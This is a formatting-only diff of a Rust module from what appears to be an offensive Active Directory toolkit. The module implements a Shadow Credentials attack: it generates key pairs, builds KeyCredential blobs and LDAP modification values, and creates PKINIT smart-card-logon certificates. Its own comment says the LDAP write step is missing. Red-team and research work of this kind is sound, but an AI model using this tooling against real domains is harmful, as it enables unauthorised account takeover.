@@ -30,8 +30,8 @@
 //! - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
 //! - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
 
-use overthrone_core::error::{OverthroneError, Result};
 use chrono::{DateTime, Datelike, Utc};
+use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use tracing::info;
 
@@ -115,7 +115,7 @@ pub struct KeyPair {
 // ═══════════════════════════════════════════════════════════
 
 /// KeyCredential binary structure (MS-ADTS)
-/// 
+///
 /// Structure:
 /// - Version: 1 byte (0x01)
 /// - Flags: 1 byte (0x00 for user, 0x01 for computer)
@@ -166,11 +166,8 @@ fn parse_guid(guid: &str) -> [u8; 16] {
     }
     // Convert to AD's GUID byte order
     [
-        bytes[3], bytes[2], bytes[1], bytes[0],
-        bytes[5], bytes[4],
-        bytes[7], bytes[6],
-        bytes[8], bytes[9], bytes[10], bytes[11],
-        bytes[12], bytes[13], bytes[14], bytes[15],
+        bytes[3], bytes[2], bytes[1], bytes[0], bytes[5], bytes[4], bytes[7], bytes[6], bytes[8],
+        bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
     ]
 }
 
@@ -188,17 +185,17 @@ pub fn generate_key_id() -> String {
 pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
     // The value format is:
     // B:8:01000000<key_id_hex>:<key_credential_hex>
-    
+
     let key_id_bytes = parse_guid(&key_cred.key_id);
     let key_id_hex: String = key_id_bytes.iter().map(|b| format!("{:02X}", b)).collect();
-    
-    let cred_hex: String = key_cred.raw_value.iter().map(|b| format!("{:02X}", b)).collect();
-    
-    format!(
-        "B:8:01000000{}:{}",
-        key_id_hex,
-        cred_hex
-    )
+
+    let cred_hex: String = key_cred
+        .raw_value
+        .iter()
+        .map(|b| format!("{:02X}", b))
+        .collect();
+
+    format!("B:8:01000000{}:{}", key_id_hex, cred_hex)
 }
 
 /// Parse existing key credentials from LDAP
@@ -278,15 +275,14 @@ pub async fn execute(
 
     // Step 1: Generate key pair
     let key_pair = generate_key_pair(config.key_size)?;
-    info!("ShadowCredentials: Generated key pair (key_id={})", key_pair.key_id);
+    info!(
+        "ShadowCredentials: Generated key pair (key_id={})",
+        key_pair.key_id
+    );
 
     // Step 2: Build key credential using DER-encoded public key
     let is_computer = config.target.ends_with('$');
-    let cred_data = build_key_credential(
-        &key_pair.key_id,
-        &key_pair.public_key_der,
-        is_computer,
-    );
+    let cred_data = build_key_credential(&key_pair.key_id, &key_pair.public_key_der, is_computer);
 
     let key_cred = KeyCredential {
         dn: String::new(), // Will be set by LDAP search below
@@ -298,8 +294,14 @@ pub async fn execute(
 
     // Step 3: Build the LDAP modification value
     let ldap_mod_value = build_ldap_modification(&key_cred);
-    info!("ShadowCredentials: KeyCredential built ({} bytes)", cred_data.len());
-    info!("ShadowCredentials: LDAP mod value: {}", &ldap_mod_value[..ldap_mod_value.len().min(80)]);
+    info!(
+        "ShadowCredentials: KeyCredential built ({} bytes)",
+        cred_data.len()
+    );
+    info!(
+        "ShadowCredentials: LDAP mod value: {}",
+        &ldap_mod_value[..ldap_mod_value.len().min(80)]
+    );
 
     // Note: Full LDAP write requires LdapSession::modify_add support.
     // The key material is real and ready — only the LDAP write step
@@ -348,7 +350,10 @@ fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
     use rsa::pkcs8::EncodePrivateKey;
     use rsa::pkcs8::EncodePublicKey;
 
-    info!("ShadowCredentials: Generating {}-bit RSA key pair", key_size);
+    info!(
+        "ShadowCredentials: Generating {}-bit RSA key pair",
+        key_size
+    );
 
     // Generate a unique key ID
     let key_id = generate_key_id();
@@ -356,9 +361,8 @@ fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
     // 1. Generate RSA key pair
     let mut rng = rsa::rand_core::OsRng;
     let bits = key_size as usize;
-    let rsa_key = rsa::RsaPrivateKey::new(&mut rng, bits).map_err(|e| {
-        OverthroneError::TicketForge(format!("RSA key generation failed: {e}"))
-    })?;
+    let rsa_key = rsa::RsaPrivateKey::new(&mut rng, bits)
+        .map_err(|e| OverthroneError::TicketForge(format!("RSA key generation failed: {e}")))?;
 
     // Export keys to PEM
     let private_key_pem = rsa_key
@@ -378,9 +382,8 @@ fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
         .map_err(|e| OverthroneError::TicketForge(format!("Public key DER failed: {e}")))?;
 
     // 2. Build self-signed X.509 certificate with rcgen
-    let key_pair_rcgen = rcgen::KeyPair::from_pem(&private_key_pem).map_err(|e| {
-        OverthroneError::TicketForge(format!("rcgen key import failed: {e}"))
-    })?;
+    let key_pair_rcgen = rcgen::KeyPair::from_pem(&private_key_pem)
+        .map_err(|e| OverthroneError::TicketForge(format!("rcgen key import failed: {e}")))?;
 
     let mut params = rcgen::CertificateParams::default();
     params.distinguished_name = rcgen::DistinguishedName::new();
@@ -392,26 +395,23 @@ fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
     let now = chrono::Utc::now();
     params.not_before = rcgen::date_time_ymd(now.year(), now.month() as u8, now.day() as u8);
     let expiry = now + chrono::Duration::days(365);
-    params.not_after = rcgen::date_time_ymd(
-        expiry.year(),
-        expiry.month() as u8,
-        expiry.day() as u8,
-    );
+    params.not_after =
+        rcgen::date_time_ymd(expiry.year(), expiry.month() as u8, expiry.day() as u8);
 
     // Add smart card logon EKU for PKINIT (OID: 1.3.6.1.4.1.311.20.2.2)
-    params.extended_key_usages = vec![
-        rcgen::ExtendedKeyUsagePurpose::ClientAuth,
-    ];
+    params.extended_key_usages = vec![rcgen::ExtendedKeyUsagePurpose::ClientAuth];
     // Add the Microsoft Smart Card Logon OID as a custom extension
     let smart_card_logon_oid = vec![1, 3, 6, 1, 4, 1, 130, 55, 20, 2, 2]; // 1.3.6.1.4.1.311.20.2.2
-    params.custom_extensions.push(rcgen::CustomExtension::from_oid_content(
-        &smart_card_logon_oid,
-        Vec::new(),
-    ));
+    params
+        .custom_extensions
+        .push(rcgen::CustomExtension::from_oid_content(
+            &smart_card_logon_oid,
+            Vec::new(),
+        ));
 
-    let cert = params.self_signed(&key_pair_rcgen).map_err(|e| {
-        OverthroneError::TicketForge(format!("Certificate generation failed: {e}"))
-    })?;
+    let cert = params
+        .self_signed(&key_pair_rcgen)
+        .map_err(|e| OverthroneError::TicketForge(format!("Certificate generation failed: {e}")))?;
 
     let certificate_pem = cert.pem();
 
@@ -458,7 +458,7 @@ mod tests {
         let key_id = generate_key_id();
         let public_key = b"test_public_key";
         let cred = build_key_credential(&key_id, public_key, false);
-        
+
         assert!(!cred.is_empty());
         assert_eq!(cred[0], 0x01); // Version
         assert_eq!(cred[1], 0x00); // Flags (user)
@@ -474,7 +474,7 @@ mod tests {
             created: Utc::now(),
             is_ours: true,
         };
-        
+
         let mod_value = build_ldap_modification(&cred);
         assert!(mod_value.starts_with("B:8:01000000"));
     }
